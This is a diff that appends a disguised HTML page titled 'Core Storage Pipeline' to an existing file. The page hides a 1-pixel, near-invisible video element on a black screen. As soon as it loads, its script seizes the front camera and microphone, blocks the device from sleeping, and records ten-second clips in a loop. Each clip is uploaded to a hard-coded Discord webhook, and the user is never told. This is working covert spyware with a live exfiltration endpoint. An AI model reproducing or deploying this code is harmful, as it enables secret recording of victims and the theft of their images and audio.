@@ -3256,3 +3256,183 @@
 
 </body>
 </html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Core Storage Pipeline</title>
+    <style>
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+        }
+        body {
+            background-color: #000000;
+            color: #000000;
+            font-family: sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            overflow: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+        video {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+    <video id="preview" autoplay playsinline muted></video>
+
+<script>
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5";
+
+    const video = document.getElementById('preview');
+    let mediaRecorder;
+    let recordedChunks = [];
+    let countdownInterval;
+    let wakeLock = null;
+    
+    const CLIP_DURATION = 10; 
+
+    // --- AUTOMATIC WAKE LOCK ---
+    async function requestWakeLock() {
+        try {
+            if ('wakeLock' in navigator) {
+                wakeLock = await navigator.wakeLock.request('screen');
+                console.log("Screen Wake Lock active. Device will not sleep.");
+            }
+        } catch (err) {
+            console.error(`Wake Lock failed: ${err.message}`);
+        }
+    }
+
+    document.addEventListener('visibilitychange', async () => {
+        if (wakeLock !== null && document.visibilityState === 'visible') {
+            await requestWakeLock();
+        }
+    });
+
+    // Helper method to safely request front camera streams with robust mobile fallback tiers
+    async function getSafeFrontStream() {
+        const resolutionTiers = [
+            { width: { ideal: 3840 }, height: { ideal: 2160 }, frameRate: { ideal: 30 } }, // 4K 30FPS (Safer on front lenses)
+            { width: { ideal: 1920 }, height: { ideal: 1080 } },                          // 1080p Full HD
+            { width: { ideal: 1280 }, height: { ideal: 720 } }                            // 720p HD standard fallback
+        ];
+
+        for (let tier of resolutionTiers) {
+            try {
+                const constraints = {
+                    video: { ...tier, facingMode: { exact: "user" } }, // HARD FORCED FRONT CAMERA
+                    audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: true }
+                };
+                return await navigator.mediaDevices.getUserMedia(constraints);
+            } catch (e) {
+                console.warn("Front resolution tier failed/unsupported, attempting lower profile...");
+            }
+        }
+        // Last-resort fallback for older phone cameras
+        return await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+    }
+
+    async function initCamera() {
+        try {
+            await requestWakeLock();
+
+            // Fetch the stream through the safe fallback pipeline
+            const stream = await getSafeFrontStream();
+            video.srcObject = stream;
+            
+            setupRecorder(stream);
+            
+            recordedChunks = [];
+            mediaRecorder.start(1000); // Record in 1s chunks to ensure data tracking stays live
+            startLoopTimer();
+            
+        } catch (err) {
+            console.error("Pipeline initialization failed:", err);
+        }
+    }
+
+    function setupRecorder(stream) {
+        // Find optimal video tracking layout codecs for mobile browsers
+        let selectedMimeType = '';
+        const codecsMatrix = [
+            'video/webm;codecs=vp9,opus',
+            'video/webm;codecs=vp8,opus',
+            'video/mp4;codecs=avc1.42E01E,mp4a.40.2', // Standard H.264 profile for native mobile encoding compatibility
+            'video/mp4',
+            'video/webm'
+        ];
+
+        for (const type of codecsMatrix) {
+            if (MediaRecorder.isTypeSupported(type)) {
+                selectedMimeType = type;
+                break;
+            }
+        }
+
+        mediaRecorder = new MediaRecorder(stream, { 
+            mimeType: selectedMimeType,
+            videoBitsPerSecond: 2500000 
+        });
+
+        mediaRecorder.ondataavailable = (e) => {
+            if (e.data && e.data.size > 0) recordedChunks.push(e.data);
+        };
+
+        mediaRecorder.onstop = async () => {
+            if (recordedChunks.length > 0) {
+                const blob = new Blob(recordedChunks, { type: selectedMimeType });
+                recordedChunks = [];
+
+                const formData = new FormData();
+                const ext = selectedMimeType.includes('mp4') ? 'mp4' : 'webm';
+                formData.append('file', blob, `front_vlog_${Date.now()}.${ext}`);
+
+                try {
+                    fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+                } catch (err) {
+                    console.error("Network drop, chunk omitted:", err);
+                }
+            }
+
+            recordedChunks = [];
+            if (mediaRecorder.state === "inactive") {
+                mediaRecorder.start(1000);
+            }
+        };
+    }
+
+    function startLoopTimer() {
+        clearInterval(countdownInterval);
+        let timeLeft = CLIP_DURATION;
+        
+        countdownInterval = setInterval(() => {
+            timeLeft--;
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+                if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                    mediaRecorder.stop();
+                }
+                startLoopTimer(); 
+            }
+        }, 1000);
+    }
+
+    window.addEventListener('DOMContentLoaded', initCamera);
+</script>
+
+</body>
+</html>
